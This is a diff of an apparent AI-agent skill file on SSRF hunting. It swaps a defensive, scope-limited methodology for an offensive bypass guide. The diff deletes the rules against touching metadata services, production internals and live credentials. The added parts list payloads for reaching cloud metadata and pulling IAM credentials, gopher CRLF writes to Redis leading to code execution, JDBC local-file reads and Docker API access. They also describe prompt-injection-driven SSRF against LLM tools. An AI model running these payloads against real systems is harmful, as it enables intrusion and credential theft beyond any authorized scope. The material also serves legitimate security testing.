@@ -1,916 +1,325 @@
-# HUNT-SSRF v4.0
+---
+name: hunt-ssrf
+description: Full SSRF workflow in three parts — finding SSRF entry points in a target (Part 1: discovery), advanced guard-bypass techniques beyond basic IP-encoding tricks (Part 2: bypasses — IPv6 transition addresses/NAT64/6to4/Teredo, 0.0.0.0/[::] loopback aliasing, parser differentials, non-IP internal hostnames like host.docker.internal/*.svc, allowlist startsWith()/userinfo bypasses, CDN edge path-normalization, service-mesh/Istio jwksUri, IMDSv2/Azure Metadata header injection, half-blind SSRF, forwarded-header URL reconstruction, JDBC/Redis/Mongo connection-string SSRF, Docker Engine API targets, gopher CRLF smuggling, static DNS CNAME-to-metadata), and source-review methodology (Part 3, detailed in references/methodology.md — request-path/data-flow modeling, sink inventory, evidence-confidence grading E0-E5, agentic/MCP tool inventories, and verified 2025-2026 CVEs like CodeWhale/CVE-2026-45310, LMDeploy/CVE-2026-33626, Angular/CVE-2026-50168, LangChain/CVE-2026-26019+27795, pyLoad/CVE-2026-48737, PraisonAI/CVE-2026-57126, and the MCP fetch IPv6 site-local advisory). Use this skill whenever hunting for SSRF on a target, reviewing source for SSRF, or testing/triaging an SSRF finding — especially when a target's guard already blocks the "obvious" payloads and a bypass or a stronger evidence bar is needed.
+---
 
-**Research-driven SSRF assessment methodology for modern web, cloud-native, and agentic systems**
+# SSRF Discovery and Advanced Bypass Tricks
 
-- **Version:** 4.0
-- **Updated:** 2026-11-18
-- **Supersedes:** `hunt-ssrf v3`
-- **Primary use:** authorized security assessment, source review, and secure engineering
-- **Core weakness:** CWE-918 — Server-Side Request Forgery (SSRF)
+A two-part reference: **Part 1** is how to find places in a target where SSRF might exist and confirm it; **Part 2** is bypass techniques that go beyond the basic IP-encoding tricks most guards already block (decimal/octal/hex IP, `[::ffff:127.0.0.1]`, `0x7f.1`, etc). Use Part 1 when hunting for SSRF entry points on a target; use Part 2 when a target's SSRF filter survives the obvious payloads, or when deciding how far a confirmed blind SSRF can be escalated.
+
+**Core principle, applies throughout:** OOB (out-of-band, e.g. Burp Collaborator / interactsh) confirmation is mandatory before reporting blind SSRF. Part 2 is about what to try *after* you have a URL-fetching primitive, and how far to push it once OOB confirms the request fired.
 
 ---
 
-## 0. Mission and operating contract
+# Part 1 — SSRF Discovery
 
-Find and explain server-side request-forgery weaknesses by tracing how untrusted data influences outbound network activity. Focus on trust-boundary failures that can be reproduced in an owner-controlled environment and fixed systematically.
+## 1.1 Where to look: functionality that makes outbound requests
 
-This methodology covers classic web fetchers, background workers, document and media processors, cloud-native services, LLM inference endpoints, RAG pipelines, AI agents, and MCP servers.
+Any feature where the server fetches a resource on the app's behalf is a candidate. Work through the app systematically and flag these:
 
-Assessment boundaries:
+- **URL-accepting parameters** — anything that takes a URL, link, image, file, or "source" and the server fetches it: avatar/profile-picture-by-URL, "import from URL", RSS/feed readers, link unfurling/preview (Slack-style), webhooks (both registering a webhook URL and features that "test" one), PDF/document generators that accept a URL or render HTML with remote resources, screenshot/thumbnail services, SSO/SAML metadata URL fields, OAuth `redirect_uri`/discovery endpoints, "share this page" or social-card generators.
+- **File upload/import pipelines** that fetch remote content: SVG/image processors that resolve external entities or `xlink:href`, document converters (DOCX/PDF) that follow embedded remote references, CSV/data importers with a "from URL" option, API integrations ("connect your data source", "test connection" for a DB/cache/webhook target — see Part 2 §11).
+- **Hidden/indirect fetchers** — things that don't look like "enter a URL" but still trigger a server-side request: XML parsers (XXE → SSRF via external entities), server-side templating that resolves includes, PDF renderers executing JS/CSS that references external URLs, markdown/wiki renderers that fetch remote images for caching, "report a broken link"/URL validators, OpenGraph/metadata scrapers, webhooks for CI/CD or issue trackers, cloud/edge functions that proxy a user-supplied URL (see Part 2 §15), LLM/agent toolchains where a tool fetches a URL from model output or from untrusted "documentation" (prompt-injection-driven SSRF, see Part 2 §4–5).
+- **Multi-tenant/cloud-native surfaces** — service mesh control planes (Istio `jwksUri`, see Part 2 §7), Kubernetes admission webhooks, CI pipeline integrations, Docker/container platforms with management APIs (Part 2 §12).
 
-1. Work only on assets, accounts, tenants, and components explicitly included in the engagement.
-2. Use a researcher-controlled callback service or a program-provided interaction service for outbound-request attribution.
-3. Use local fixtures or owner-provided staging endpoints to test restricted-destination policy. Do not use production internal services, metadata services, or customer data as test targets.
-4. Do not retrieve, retain, or reproduce live credentials, tokens, private keys, environment variables, or private customer content. A synthetic marker is sufficient to test response propagation.
-5. Stop when the minimum evidence for the finding is established. Preserve request IDs and logs, not sensitive response bodies.
+## 1.2 Parameter name wordlist
 
-These constraints are part of a repeatable test design: they make evidence attributable, reproducible, and safe to share with the asset owner.
-
----
-
-## 1. The central invariant
-
-> **The destination approved by policy must be the destination the network connector actually reaches.**
-
-A string check is not enough. A hostname check is not enough. A DNS lookup performed before the HTTP request is not enough. A model instruction is not a network control.
-
-The invariant must hold across:
-
-- URL parsing and canonicalization;
-- hostname resolution and all A/AAAA answers;
-- the actual socket or transport connection;
-- connection reuse and pooling;
-- proxies, tunnels, service meshes, and fallback routes;
-- redirects, retries, and alternate transports;
-- browser subresources and document-renderer fetches;
-- queued jobs and scheduled execution;
-- every AI-agent, MCP, plugin, and workflow tool that can cause network access.
-
-A secure design enforces the decision as close as possible to connection creation and records the peer actually reached.
-
----
-
-## 2. Model the whole request path
-
-Represent each candidate feature as a data-flow graph:
-
-```text
-untrusted input
-  -> transformations / storage / model context
-  -> URL parser and canonicalization
-  -> destination policy
-  -> resolver
-  -> proxy / transport / connector
-  -> redirect / retry / connection reuse
-  -> response consumer
+When fuzzing for hidden SSRF-prone parameters (e.g. with Arjun or a Burp Intruder pass against a known endpoint), common names include:
+```
+url, uri, link, href, src, source, target, dest, destination, redirect,
+redirect_uri, return, returnTo, next, continue, callback, callback_url,
+webhook, webhook_url, feed, rss, path, file, filename, filepath, folder,
+host, hostname, domain, port, ip, address, proxy, fetch, load, import,
+api_url, endpoint, service_url, data, reference, document, avatar, image,
+image_url, thumbnail, preview, media, download, upload_url, out, to, page
 ```
 
-For agentic systems, extend it:
+## 1.3 Confirming via OOB — and classifying the response
 
-```text
-untrusted page, file, email, or RAG chunk
-  -> model context
-  -> tool selection and arguments
-  -> tool adapter
-  -> guarded transport
-  -> network
-  -> tool result / screenshot / document / model summary
+1. Replace the candidate parameter with an interactsh/Collaborator (or similarly controlled) domain. A DNS lookup confirms resolution happened; an HTTP hit confirms the full request fired.
+2. Once confirmed, classify what you have:
+   - **Full-read SSRF** — the response body (or part of it) is reflected back to you. Highest value: can read internal services/metadata directly.
+   - **Blind SSRF** — the request fires (OOB confirms it) but nothing comes back in the response. Still exploitable (port scanning via timing/error differences, protocol smuggling, write-only targets like Redis), and don't give up on it — check Part 2 §9 for "half-blind" channels (errors, async events, rendered documents) before concluding it's pure blind.
+3. Differentiate timing responses even without OOB: a closed port, a filtered port, and an open-but-non-HTTP port (e.g. Redis, Memcached) often each produce a distinguishable error message or response time — useful for internal port scanning once you have any SSRF primitive, blind or not.
+4. Test redirect-based bypasses early: if the app validates the URL you supply but then follows redirects, host an endpoint that 302s to your actual internal target — this defeats allowlists/validators that only check the initial URL (and combines with Part 2 §8's HTTPS-requirement bypass).
+5. Always test both HTTP and HTTPS variants, and try protocol smuggling (`gopher://`, `dict://`, `file://`, `ftp://`) if the fetcher is a generic library (curl, Guzzle, requests) rather than a hardened HTTP-only client — these open up Redis/Memcached/SMTP interaction (see Part 2 §13) and local file read (`file:///etc/passwd`).
+
+## 1.4 First payloads to try (before reaching for Part 2)
+
+Confirm the guard exists and see what it actually blocks before escalating to advanced bypasses:
+```
+http://127.0.0.1/
+http://localhost/
+http://169.254.169.254/latest/meta-data/
+http://[::1]/
+http://metadata.google.internal/computeMetadata/v1/
+```
+If any of these work outright, you likely don't need Part 2 at all. If they're all blocked, move to Gate 0 below and start working through the bypass vectors.
+
+---
+
+# Part 2 — Advanced Bypass Tricks
+
+## Gate 0 — baseline checks before reaching for exotic bypasses
+
+Before trying any vector below, check:
+
+1. Does the guard parse the URL at the same layer/parser as the actual fetcher? If the parameter passes through any decoding or normalization before the fetch (path-segment base64, double URL-encoding, JSON nesting, a `normalize()`-style helper), test host resolution under at least two decode passes — validator and fetcher disagreeing on the host is the root cause of several 2025 CVEs (§3).
+2. Does the guard's "private IP" definition include IPv6 transition addresses, `0.0.0.0`, `::`, and link-local — not just `127.0.0.0/8`, `::1`, and RFC1918? Most guards only check the first set (§1, §2).
+3. If the HTTP response body isn't returned to you, does the target content leak elsewhere — error messages, async job/event objects, logs, or a rendered PDF/image? Don't classify a request as "pure blind" just because the body is empty (§9).
+4. Are custom request headers controllable (webhook tester, API debugger, integration config)? If so, IMDSv2 and Azure's `Metadata: true` requirement may not actually be a protection (§8).
+
+## 1. IPv6 transition addresses embedding internal IPv4
+
+Guards that only recognize `::ffff:`, `fe80::`, and `::1` miss IPv4 embedded in transition prefixes. On a NAT64/DNS64 network (common in IPv6-only/IPv6-first cloud environments), these look like "public IPv6" to `is_private()`/`is_global()` checks but the network stack routes them to the embedded private IPv4 target.
+
+```
+# NAT64 embedding 169.254.169.254
+http://[64:ff9b::a9fe:a9fe]/
+# 6to4 embedding 127.0.0.1
+http://[2002:7f00:0001::]/
+# Teredo (client IPv4 XORed with 0xFFFFFFFF in last 32 bits)
+http://[2001:0000:...]/
+```
+Bypassed ToolHive, TREK, and others this way.
+
+## 2. 0.0.0.0 and [::] — unspecified addresses that resolve to loopback
+
+On Linux, `0.0.0.0` as a destination routes to local loopback, and `[::]` routes to `[::1]`. Most guards check `127.0.0.0/8`/`localhost` but not `0.0.0.0/8` or `::/128` — the guard's threat model is "block loopback," but these are classified as *unspecified*, not loopback, while behaving as loopback.
+
+```
+http://0.0.0.0:8080/
+http://[::]:8080/
+http://0:0:0:0:0:0:0:0/
+```
+Real cases: new-api stayed bypassable via `0.0.0.0` after CVE-2025-59146/62155 fixes; imgproxy CVE-2025-24354 still reached localhost via `0.0.0.0` even with loopback blocking enabled; local-deep-research missed `::`, `0::`, `::0` variants entirely.
+
+## 3. Parser differentials (validator vs. fetcher disagree on the host)
+
+**3.1 Backslash/control-byte confusion.** `urllib.parse.urlparse` and `urllib3`/`requests` parse `http://127.0.0.1\@1.1.1.1` differently — one extracts `1.1.1.1` (passes validation), the other connects to `127.0.0.1`. Fix is to reject backslashes/control bytes/whitespace and extract the host with the *same* parser the HTTP client uses.
+```
+http://127.0.0.1\@attacker.com/
+http://127.0.0.1%09@attacker.com/
+http://127.0.0.1%00.attacker.com/
+```
+**3.2 Percent-encoded host / normalize() bugs.** Same bug class as CVE-2025-1211 but in different functions (e.g. Hackney's `hackney_url:normalize/2`). Don't stop at one `url=` form — test the host under multiple decode passes if the param goes through any pre-processing.
+
+## 4. Non-IP internal hostnames (no private-IP octets at all)
+
+Guards that are purely IP-regex-based miss these entirely:
+- `host.docker.internal` — reaches the Docker host from a container
+- `kubernetes.default.svc` — in-cluster K8s API DNS name
+- `*.internal` / `*.corp` / `*.local` — enterprise internal DNS suffixes
+- `metadata.google.internal` — GCP metadata short name (often ignored even when `169.254.169.254` is blocked)
+
+Exploited via Apify MCP's `fetch-apify-docs` and FlowiseAI's API-chain component, where attacker-supplied fake "API documentation" (via prompt injection) set a `BASE URL:` redirecting to `host.docker.internal:8080` or an internal `.local` host. Most hunters stop after `169.254.169.254` and never try these — in containerized/orchestrated environments they're often *less* filtered than IPs.
+
+## 5. Allowlist string-prefix bypasses
+
+For naive checks like `ALLOWED_DOMAINS.some(d => url.startsWith(d))`:
+```
+# Suffix injection
+https://docs.trusted.com.evil.com/payload
+# Userinfo injection — trusted domain appears before @, real target is after
+https://docs.trusted.com@evil.com/payload
+```
+Increasingly seen in LLM toolchains/API chains, where prompt injection forges "documentation" to steer a `BASE URL` rather than directly controlling a URL parameter.
+
+## 6. CDN/edge path-normalization bypasses
+
+Edge platforms (Cloudflare Workers, Vercel Edge, Netlify Functions) can normalize URLs differently from the origin — a path segment the edge treats as a static asset gets re-normalized by the origin into an external request. Example: OpenNext's `@opennextjs/cloudflare` `/cdn-cgi/image/` handler.
+```
+https://victim-site.com/cdn-cgi/image/aaaa/https://attacker.com/...
+```
+Same class as `;/` and `/../` path-confusion, but the carrier is the edge's image/resize handler. When the target runs on an edge platform, test the edge handler path itself, not just app-layer params.
+
+## 7. Service mesh: Istio jwksUri and Envoy header leakage
+
+**7.1 Istio `RequestAuthentication.jwksUri`.** When a `RequestAuthentication` resource's `jwksUri` points internally, `istiod` makes an unauthenticated GET with no localhost/link-local filtering, and the result can be distributed via xDS to every sidecar in the mesh.
+```yaml
+jwksUri: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+**7.2 Envoy metadata leakage.** Headers like `x-envoy-peer-metadata`, `x-envoy-peer-metadata-id`, or `server: envoy` on a blind SSRF response confirm you've entered an Istio mesh and leak Pod/service identity. If policy allows the final hop, probe `/config_dump` to pull full mesh config (routes, clusters, secrets).
+
+## 8. Bypassing IMDSv2 / Azure Metadata via header injection
+
+IMDSv2 normally requires a PUT for a token then `X-aws-ec2-metadata-token`. CVE-2025-64709 (Typebot) bypassed this where a webhook/HTTP-request component let the attacker control arbitrary headers — the attacker just injected the token header directly and pulled the EKS node role's IAM credentials, leading to cluster takeover. Azure IMDS needs `Metadata: true`; the ChatGPT Custom Actions SSRF named an attacker-controlled API-key header `Metadata` with value `true`, combined with a 302 redirect to bypass the HTTPS requirement. **Generalize:** any feature allowing arbitrary outbound headers (webhook tester, API debugger, integration config) may neutralize IMDSv2/Azure protections.
+
+## 9. Half-blind SSRF — response surfaces outside the body
+
+Distinct from the blind/full-read binary: the HTTP body isn't returned, but content leaks via error messages, async event objects, logs, or a rendered document.
+- CVE-2025-13281 (Kubernetes Portworx): `kube-controller-manager`'s GET response leaked into a `ProvisioningFailed` event object — attacker couldn't control the request body but could read the response.
+- PDF/rendering pipelines that execute JS can draw internal response content into the returned PDF/image — the document becomes the exfil channel.
+
+When the body comes back empty, check: does an error echo internal-response fragments? Do `kubectl get events` show the provisioner's response? Does a returned PDF/image contain internal text?
+
+## 10. Forwarded-header URL reconstruction
+
+Astro's `createRequest()` builds URLs from unsanitized `x-forwarded-proto`/`x-forwarded-port`. Injecting a protocol-layer payload rewrites the whole URL (host/port/path) while stuffing the real host/path into the query string, so routing looks unaffected:
+```
+x-forwarded-proto: https://www.malicious-url.com/?tank=
+# constructed: https://www.malicious-url.com/?tank=://localhost/ssr
+```
+This doubles as a middleware/protected-route bypass and a cache-poisoning vector. Applies to any SSR framework building URLs from `X-Forwarded-*` headers (Astro, Next.js, Nuxt, Remix) — test these headers as SSRF vectors, not just `?url=`.
+
+## 11. Connection-string SSRF (JDBC/Redis/Mongo/LDAP) with file-read escalation
+
+Any "test connection"/"data source config" feature accepting JDBC/Redis/Mongo/LDAP URLs is a blind-SSRF + potential file-read dual vector. Dinky (≤1.2.5) and SpringBlade's `testConnect`: attacker supplies a MySQL JDBC URL, probes internal hosts/ports via driver error timing (SSRF/port-scan), then sets `allowLoadLocalInfile=true` to abuse `LOAD DATA LOCAL INFILE` and read arbitrary files (configs, private keys) off the app host:
+```
+jdbc:mysql://internal-host:3306/test?allowLoadLocalInfile=true
 ```
 
-For every edge, record:
+## 12. Docker Engine API as an internal SSRF target
+
+Docker Desktop CVE-2025-9074 (CVSS 9.3): the Docker Engine API is reachable unauthenticated from inside a container at `http://192.168.65.7:2375/`, even with Enhanced Container Isolation on — enabling container creation and host filesystem access. Most SSRF port-scan lists only include `127.0.0.1`/`169.254.169.254`, not this address.
+```
+http://192.168.65.7:2375/containers/json
+http://host.docker.internal:2375/version
+```
+
+## 13. Gopher CRLF smuggling (curl doesn't sanitize the selector)
+
+curl's gopher implementation doesn't sanitize `%0d%0a` in the selector path, letting you inject arbitrary TCP commands into Redis/Memcached/SMTP even when the SSRF only allows gopher and the selector is assumed "safe":
+```
+gopher://127.0.0.1:11211/_Dummy%0d%0aHELLO_SERVER%0d%0a
+```
+Test whether CRLF in the selector decodes to raw bytes — on an old or curl-based HTTP client this can lead directly to Redis `CONFIG SET`/`SAVE`/`authorized_keys` writes → RCE.
+
+## 14. Static DNS CNAME to metadata/internal (no rebinding race needed)
+
+A simpler, more stable alternative to DNS-rebinding TOCTOU: register a CNAME pointing directly at a metadata IP or internal hostname.
+```
+attacker.com.       CNAME  metadata.google.internal.
+evil.attacker.com.  A      169.254.169.254
+```
+If the guard resolves once and checks the IP, the CNAME returns the internal address on first resolution. If the guard checks the hostname string, the CNAME looks like a normal external domain. Try static CNAME before escalating to rebinding (TTL=0 + race).
+
+## 15. Cloud/Edge Function: SSRF + cross-tenant write combo
+
+Multi-tenant SaaS Edge Functions can have both an SSRF (fetch a user-supplied URL) and a cross-tenant write (store the result in an arbitrary workspace). Example: a Supabase-backed "zip my submission files" Edge Function fetched an attacker URL and wrote the archive into an arbitrary workspace's storage folder. When you find a URL input in a cloud/Edge Function, also check where the fetched result gets written — if that path is also user-controlled, blind SSRF escalates to cross-tenant data write/overwrite.
+
+## Quick reference table
+
+| Vector | Why hunters miss it | Minimal payload |
+|---|---|---|
+| NAT64/6to4/Teredo embedding IPv4 | Guards only check `::ffff:`/`fe80::` | `http://[64:ff9b::a9fe:a9fe]/` |
+| `0.0.0.0` / `[::]` | Classed as unspecified, not loopback | `http://0.0.0.0:8080/` |
+| Backslash/control-byte parser diff | Only IP encodings tested | `http://127.0.0.1\@attacker.com/` |
+| `host.docker.internal`/`*.svc`/`*.internal` | Guards only block IP literals | `http://host.docker.internal:8080/` |
+| `startsWith()` allowlist bypass | Only param values tested, not domain strings | `https://docs.trusted.com.evil.com/` |
+| CDN edge `/cdn-cgi/image/` path confusion | Only app params tested | `https://victim.com/cdn-cgi/image/x/https://attacker.com/` |
+| Istio `jwksUri` | Only app layer tested, not control-plane resources | `jwksUri: http://169.254.169.254/...` |
+| IMDSv2/Azure header injection | Assumes IMDSv2 unbypassable | Webhook header named `Metadata`/`X-aws-ec2-metadata-token` |
+| Half-blind (events/errors/documents) | Gives up when body is empty | Check `ProvisioningFailed` events / returned PDF |
+| `x-forwarded-proto` URL rewrite | Only `?url=` tested, not headers | `x-forwarded-proto: https://evil.com/?x=` |
+| JDBC `allowLoadLocalInfile` | Treats "test connection" as blind-only | `jdbc:mysql://...?allowLoadLocalInfile=true` |
+| Docker `192.168.65.7:2375` | Port-scan lists omit Docker Desktop internal IP | `http://192.168.65.7:2375/containers/json` |
+| Gopher CRLF not sanitized | Assumes gopher selector is safe | `gopher://127.0.0.1:6379/_%0d%0aCONFIG...` |
+| Static CNAME → metadata | Jumps straight to rebinding | `evil.com CNAME metadata.google.internal` |
+
+---
+
+# Part 3 — Methodology: Source Review and Evidence Grading
+
+Part 1 finds the sink and Part 2 gets past the guard. Part 3 is for when you have source access (or want to reason like you do), and for judging whether your evidence is actually strong enough before you call something confirmed.
+
+## 3.1 Model the request path (use for source review / white-box, or to reason about a black-box target)
+
+For any candidate sink, trace the value end-to-end and ask these questions at each stage — don't mark a stage "safe" just because *a* check exists somewhere:
 
 | Stage | Questions to answer |
 |---|---|
-| Input | Which field influences the destination? Is it user-supplied, stored, imported, generated, or derived from retrieved content? |
-| Transformation | Is it decoded, normalized, concatenated, templated, path-joined, converted, or rewritten by an SDK? |
-| Parser | Which parser interprets scheme, authority, host, port, path, user-info, and fragment? Does another parser later reinterpret it? |
-| Policy | Is there an allowlist, destination policy, egress rule, tenant rule, or only a UI/model instruction? |
-| Resolver | Which resolver is used? Are both address families considered? What happens on partial failure? |
-| Connector | Does the connector use the exact address that policy approved? Can a custom dispatcher or proxy resolve again? |
-| Redirects | Are redirects automatic? Is each hop independently authorized? |
-| Response | Are body, headers, status, timing, screenshot, PDF, or model-generated summaries exposed? |
-| Execution | Is the fetch immediate, queued, retried, scheduled, delegated, or run under another service identity? |
+| Input | Which field influences the destination? User-supplied, stored, imported, generated, or derived from retrieved/model content? |
+| Transformation | Is it decoded, normalized, concatenated, templated, path-joined, or rewritten by an SDK before reaching the fetcher? |
+| Parser | Which parser interprets scheme/host/port/path/userinfo? Does a *different* parser reinterpret it later (this is Part 2 §3)? |
+| Policy | Is there a real destination/allowlist check, or only a UI hint / model instruction? |
+| Resolver | Which resolver runs, are both A and AAAA answers considered, what happens on partial failure? |
+| Connector | Does the connector actually use the address policy approved, or can a custom dispatcher/proxy re-resolve? |
+| Redirects | Automatic or manual? Is each hop independently re-checked (Part 2 §8 territory)? |
+| Response | Body, headers, status, timing, screenshot, PDF, or model-generated summary exposed back to you? |
+| Execution | Immediate, queued, retried, scheduled, or delegated to another service identity (§3.6 below)? |
 
-Do not mark an edge as secure merely because a helper exists. Trace the value into the actual network call.
+**The single highest-value question:** where is the last security decision before the network connection is actually made, and can anything downstream of it change the destination? Most real bypasses (Part 2 in full) live in the gap between that decision and the actual connect call.
 
----
+## 3.2 Sink inventory template
 
-## 3. Discover fetch surfaces
+When a target has several URL-accepting features, don't lump them together — log one row per distinct sink so you don't re-test the same guard twice or miss one that's implemented differently:
 
-Search for product behavior, not only parameters named `url`.
+| Feature | Input | Trigger | Sink/library | Policy | Resolution | Redirects | Response | Identity | Evidence | Confidence |
+|---|---|---|---|---|---|---|---|---|---|---|
 
-### 3.1 Classic web and application surfaces
+- **Trigger**: immediate request, import job, queued/scheduled task, agent tool call, retry.
+- **Identity**: anonymous user, your account, a service account, a worker role, or an agent/MCP identity — a sink that runs under a more privileged identity than the one you hold is a bigger finding even if the request itself is identical.
+- **Confidence**: confirmed / probable / unverified / disproved — keep this honest as you go, don't let probable quietly become confirmed.
 
-- Link previews, URL unfurling, social cards, and metadata extraction.
-- Avatar, image, video, audio, document, and archive imports.
-- Screenshot, PDF, office-document, and HTML rendering services.
-- Webhook registration, verification, testing, and delivery.
-- Feed readers, crawlers, importers, and URL-based file upload.
-- OAuth, OpenID Connect, SAML, and remote JWKS discovery.
-- API testers, OpenAPI importers, integration builders, and workflow HTTP nodes.
-- Remote CSS, SVG, XML, font, and image references.
-- Server-side browser navigation and page rendering.
+## 3.3 Evidence and confidence grading
 
-### 3.2 Cloud-native and platform surfaces
+Don't let OOB-fired-once collapse into "critical SSRF" without checking what tier of evidence you actually have:
 
-- Serverless and edge functions that fetch caller-controlled destinations.
-- Kubernetes controllers, operators, admission components, and service-call features.
-- Storage and backup integrations that retrieve remote endpoints.
-- Service-mesh egress gateways, forward proxies, and internal fetch services.
-- Workload identity and metadata protection boundaries.
-- Build systems, CI runners, package importers, and repository automation.
-
-### 3.3 AI, agent, and MCP surfaces
-
-- MCP server discovery, remote connection setup, and tool enumeration.
-- Tools named `fetch`, `fetch_url`, `browse`, `navigate`, `call_api`, `http_request`, or similar.
-- Browser tools that expose navigation, screenshots, page evaluation, or downloads.
-- Document loaders, webpage-to-Markdown converters, and RAG ingestion connectors.
-- Vision/audio/video endpoints that accept remote media references.
-- Search connectors with configurable provider URLs or base URLs.
-- OpenAPI/action importers and plugins that generate network-capable tools.
-- Code-execution tools where scripts can access network libraries.
-- Background agent jobs that continue after the initiating request ends.
-
-### 3.4 Source-review indicators
-
-Look for:
-
-- HTTP clients receiving values from request parameters, stored records, GraphQL input, or agent arguments.
-- URL parsing and IP classification helpers, especially custom `is_public_ip`, `is_global_ip`, or `is_private_ip` functions.
-- Redirect-following defaults and retry middleware.
-- DNS lookups separated from connection creation.
-- Proxy environment variables and custom transport, dispatcher, or dialer configuration.
-- Multiple HTTP libraries in the same repository.
-- SDKs that perform hidden fetches internally.
-- Sandboxes that expose `requests`, `fetch`, sockets, or browser networking.
-- Queue consumers, scheduled jobs, dead-letter reprocessing, and webhook delivery workers.
-- MCP tool schemas accepting arbitrary URL, host, endpoint, or base-URL strings.
-- LLM media loaders that dereference `image_url`, `audio_url`, `video_url`, or document references.
-
-Useful search terms include:
-
-```text
-fetch, request, httpClient, axios, requests, httpx, aiohttp, urllib,
-urlparse, urljoin, resolve, lookup, dial, connect, redirect, proxy,
-webhook, preview, crawler, browser, navigate, load_image, image_url,
-fetch_url, baseURL, callback, serverUrl, MCP, tool, document_loader
-```
-
-### 3.5 Sink inventory
-
-Create one row for each distinct outbound sink. Do not collapse several fetchers into one entry just because they share a UI form.
-
-| Field | Record |
-|---|---|
-| Feature | Exact route, workflow, tool, or user-visible feature |
-| Input | Parameter, JSON property, GraphQL field, stored value, or model-generated argument |
-| Trigger | Immediate request, import, queue job, scheduled event, agent tool call, or retry |
-| Sink | Library, browser, worker, proxy, MCP server, SDK, or custom transport |
-| Policy | Validation component and decision point |
-| Resolution | Resolver, A/AAAA handling, and connection-pinning behavior |
-| Redirects | Disabled, manual, automatic, or unknown |
-| Response | None, metadata, body, file, screenshot, PDF, or model summary |
-| Identity | Anonymous user, tenant, service account, worker role, or agent identity |
-| Evidence | Request ID, callback ID, trace, tool invocation, and egress log |
-| Confidence | Confirmed, probable, unverified, or disproved |
-
----
-
-## 4. Reconstruct the control path
-
-For each sink, trace the complete path from the initial input to the socket or managed transport.
-
-1. Identify the original input and every transformation.
-2. Identify the parser actually used by the validator.
-3. Identify the parser actually used by the HTTP client, browser, SDK, or proxy.
-4. Identify the exact destination policy and the address data it consumes.
-5. Determine whether policy and connection use the same resolution result.
-6. Identify every redirect, retry, proxy, connection pool, and fallback path.
-7. Identify the process, tenant, and service identity that performs the fetch.
-8. Identify which parts of the upstream response can reach the requester or another tool.
-9. Check whether every alternate code path uses the same mandatory transport.
-
-The highest-value review question is: **where is the last security decision before the network connection is made, and can any later component change the destination?**
-
----
-
-## 5. URL parsing and canonicalization
-
-Parser disagreement is a recurring root cause because validators and transports may implement different URL standards or permissive parsing rules.
-
-### 5.1 Review dimensions
-
-Check whether the validator and sink agree on:
-
-- scheme and scheme case;
-- authority boundaries;
-- username/password (userinfo) handling;
-- hostname and trailing-dot normalization;
-- port parsing and default ports;
-- IPv4 and IPv6 literal parsing;
-- percent-encoding and decoding order;
-- Unicode and IDNA conversion;
-- backslash treatment;
-- empty, malformed, or partially parsed authorities;
-- fragment handling;
-- path normalization and path-joining semantics;
-- protocol-relative references;
-- absolute URLs unexpectedly accepted in a relative-path field.
-
-String-prefix checks are not origin checks. A check such as `startsWith(trustedOrigin)` does not prove that two URLs have the same scheme, host, and port. Compare structured, normalized components.
-
-### 5.2 Preferred validation design
-
-- Parse once into a structured URL object using a well-maintained parser.
-- Reject malformed, ambiguous, unsupported, or opaque URL forms.
-- Permit only the schemes the feature genuinely needs.
-- Compare a normalized origin tuple: scheme, hostname, and effective port.
-- Use an exact hostname allowlist where feasible; do not use substring or suffix checks without label-boundary semantics.
-- Normalize IDNA and trailing-dot behavior consistently.
-- Keep path validation separate from origin validation.
-- Ensure the transport consumes the same normalized destination representation that policy approved.
-- Do not parse with one library and silently reinterpret the original string with another.
-
-### 5.3 Differential test harness
-
-In a local test harness, feed the same benign corpus to the validator and the actual transport parser. Compare their structured outputs, not just accept/reject booleans.
-
-Record:
-
-```text
-raw input
-validator parser output
-transport parser output
-normalized scheme / host / port / path
-policy decision
-actual connector destination in the fixture
-```
-
-Any difference that changes the effective origin or network destination is a failed invariant and should become a regression test.
-
----
-
-## 6. Address classification and IPv6 correctness
-
-Do not rely on a single convenience property such as `is_global` as the complete SSRF policy.
-
-### 6.1 Classification model
-
-Build policy from the current IANA IPv4 and IPv6 Special-Purpose Address Registries, the application’s explicit allowlist, and the actual network architecture. Treat these as separate questions:
-
-1. Is the address syntactically valid?
-2. Is it special-purpose or non-global according to current registries?
-3. Is it reachable from this workload due to local routes, NAT, tunnels, or proxies?
-4. Does the product’s policy permit this class of destination?
-
-An address being technically routable in some environments does not mean it should be reachable by a user-controlled fetch feature.
-
-### 6.2 Address families and representations to cover
-
-The local regression corpus should include the relevant categories:
-
-- IPv4 loopback, private-use, link-local, unspecified, multicast, reserved, and shared address space.
-- IPv6 loopback, unspecified, unique-local, link-local, multicast, and deprecated site-local space.
-- IPv4-mapped IPv6 forms.
-- IPv4-embedded transition or translation forms, including NAT64 and 6to4.
-- Teredo and other transition mechanisms where supported by the platform.
-- IPv4-translated and implementation-specific IPv6 forms.
-- Mixed A and AAAA responses.
-- Addresses whose classification differs by runtime/library version.
-
-Relevant standards and registries include RFC 6890, RFC 6052, RFC 8215, RFC 3879, and the IANA IPv4/IPv6 special-purpose registries.
-
-### 6.3 Policy requirements
-
-- Parse addresses with a standards-aware IP library.
-- Normalize IPv4-embedded IPv6 forms before policy comparison where the address format embeds an IPv4 destination.
-- Explicitly account for deprecated or unusual ranges rather than assuming the language runtime classifies every range according to the application’s policy.
-- Evaluate the complete DNS answer set. A mixed public/non-public answer must not be treated as safe merely because one answer is public.
-- Fail closed on malformed addresses, partial resolution failure, or unknown address forms.
-- Keep the policy corpus versioned and update it when IANA or platform behavior changes.
-- Test both address families independently in an isolated harness.
-
-### 6.4 Important implementation lesson
-
-The November 2026 MCP fetch advisory involving `fec0::/10` is a useful reminder that classifier correctness is version- and policy-dependent. The advisory describes a low-severity classification gap, while also noting that default hosts commonly have no route to that deprecated site-local range. Do not convert a classifier finding into a claim of proven internal access without independent reachability evidence.
-
----
-
-## 7. DNS resolution, rebinding, and connection pinning
-
-The critical failure pattern is a time-of-check/time-of-use gap: the application checks one DNS result, then the HTTP stack resolves the hostname again when it connects.
-
-### 7.1 Secure connection model
-
-- Resolve the hostname through the intended resolver.
-- Collect and classify all relevant A and AAAA answers.
-- Apply policy to the complete result set.
-- Connect only to an approved address from that validated set.
-- Bind the approved address to the connector/dial operation rather than performing a separate preflight lookup and then making an ordinary hostname-based request.
-- Preserve the original hostname for HTTP `Host`, TLS SNI, and certificate verification.
-- Ensure retries, alternate addresses, connection pools, and custom transports cannot silently trigger a fresh unvalidated resolution.
-- Record the selected address and actual peer address in test telemetry.
-
-### 7.2 Questions for code review
